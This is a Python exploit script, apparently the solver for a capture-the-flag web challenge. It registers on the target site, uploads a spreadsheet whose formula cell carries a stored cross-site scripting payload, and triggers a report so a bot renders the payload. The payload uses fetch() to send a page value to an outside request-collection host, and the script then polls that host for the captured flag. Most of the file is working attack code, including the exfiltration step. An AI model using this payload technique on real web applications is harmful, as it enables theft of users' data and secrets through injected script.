#!/usr/bin/env -S python3 -u
# -*- coding: utf-8 -*-
# This exploit template was generated via:
import re
import os
import random
import json
import time
import requests

from bs4 import BeautifulSoup
from openpyxl import load_workbook


# Find flag by exact match or format
# log.success(find_flag(io.recvall()))
real_flag = open("./flag.txt", "r").readline().strip()
fake_flag = open("./flag-fake.txt", "r").readline().strip()


def find_flag(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    # Match real flag
    if real_flag in output:
        return real_flag
    # Match fake flag
    if fake_flag in output:
        return fake_flag
    # Match possible local flag
    with open("/flag.txt", "r") as local:
        locl_flag = local.readline().strip()
        if locl_flag in output:
            return locl_flag
    # Match regexp flag
    r = find_flag_fmt(output)
    if r is not None:
        return r
    # Definitely no flag found
    return None


# Find flag by format
# log.success(find_flag_fmt(io.recvall()))
ffmt = re.compile(r"gctf{.*}")


def find_flag_fmt(output):
    if not isinstance(output, str):
        output = output.decode(errors="ignore")
    m = ffmt.search(output)
    if m is None:
        return None
    return m.group(0)


wait_between_requests = 5
timeout = 120  # seconds

protocol = os.environ.get("PROTOCOL", "http")
host = os.environ.get("HOST", "localhost")
port = int(os.environ.get("PORT", "1337"))

name = random.randint(1_000_000_000, 9_000_000_000)

request = "<REQUESTS_BASKETS_URL>"
token = "<REQUESTS_BASKETS_TOKEN>"

url = f"{protocol}://{host}:{port}"


def createBucket():
    print(f"[+] Create bucket {name}", flush=True)
    res = requests.post(
        f"{request}/api/baskets/{name}", headers={"Authorization": f"{token}"}
    )
    content = res.content.decode()
    json_content = json.loads(content)
    return json_content["token"]


def deleteBucket():
    print("[+] Delete bucket", flush=True)
    requests.delete(
        f"{request}/api/baskets/{name}", headers={"Authorization": f"{token}"}
    )


def getRequests():
    res = requests.get(
        f"{request}/api/baskets/{name}/requests", headers={"Authorization": f"{token}"}
    )
    content = res.content.decode()
    json_content = json.loads(content)
    return json_content["requests"]


def exploit(instance):
    print("[*] Exploit", flush=True)
    session = requests.Session()
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    data = {
        "password": ".Qwer69!",
    }

    response = session.post(
        f"{url}/register",
        headers=headers,
        data=data,
        verify=False,
    )

    soup = BeautifulSoup(response.text, "html.parser")
    div_content = soup.find("div", class_="alert alert-info").get_text(strip=True)
    username_prefix = "Please log in as: "
    username = div_content.split(username_prefix)[-1]

    if not username:
        print("     [!] Could not register", flush=True)
        deleteBucket()
        exit(1)
    else:
        print(f"    [#] Registered as {username}", flush=True)

    data = {
        "username": username,
        "password": ".Qwer69!",
    }

    response = session.post(
        f"{url}/login",
        headers=headers,
        data=data,
        verify=False,
    )

    if response.status_code != 200 or f"Hello, {username}!" not in response.text:
        print("    [!] Could not login", flush=True)
        deleteBucket()
        exit(1)
    else:
        print(f"    [#] Logged in as {username}", flush=True)

    print("    [#] Preparing XLSX", flush=True)
    workbook = load_workbook(filename="expl.xlsx")
    sheet = workbook.active
    sheet["C2"] = (
        f'=IF(ISBLANK(E2),1,"/onerror=fetch(\'{instance}?u=\'+document.getElementsByTagName(\'li\')[0].attributes.value.nodeValue)/")'
    )

    workbook.save("expl.xlsx")

    files = {
        "race_name": (None, "Exploit"),
        "comment": (None, "Exploit"),
        "file": ("expl.xlsx", open("expl.xlsx", "rb"), "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"),
    }

    #print(requests.Request("POST", f"{url}/my_races", files=files).prepare().body)

    response = session.post(
        f"{url}/my_races",
        files=files,
        verify=False,
    )

    if response.status_code != 200 or "Race data uploaded and processed successfully!" not in response.text:
        print(f"   [!] Could not upload.", flush=True)
        deleteBucket()
        exit(1)
    else:
        print("    [#] Uploaded", flush=True)

    response = session.get(
        f"{url}/",
        verify=False,
    )

    try:
        soup = BeautifulSoup(response.text, "html.parser")
        ul = soup.find('ul', class_='list-group')
        li = ul.find('li', class_='list-group-item')
        race_link = li.find('a', href=True)
        race_id = int(race_link['href'].split('/')[-1])
    except:
        print(f"    [!] Could not get race_id.", flush=True)
        deleteBucket()
        exit(1)

    response = session.get(f"{url}/race/{race_id}/report", verify=False)
    print(f"    [#] Race {race_id} repored.", flush=True)
    print("[*] Exploit done.", flush=True)


createBucket()

instance = f"{request}/{name}"

exploit(instance)

max_iterations = int(timeout / wait_between_requests)
for i in range(max_iterations):
    print(f"[+] Waiting for flag ({i+1}/{max_iterations})", flush=True)
    entries = getRequests()
    for entry in entries:
        query = entry["query"]
        flag = find_flag(query)
        if flag:
            print(f"\033[93m[+] Flag: {flag}\033[0m", flush=True)
            deleteBucket()
            exit(0)
    time.sleep(wait_between_requests)

print("[+] Flag could not be found", flush=True)
deleteBucket()
exit(255)
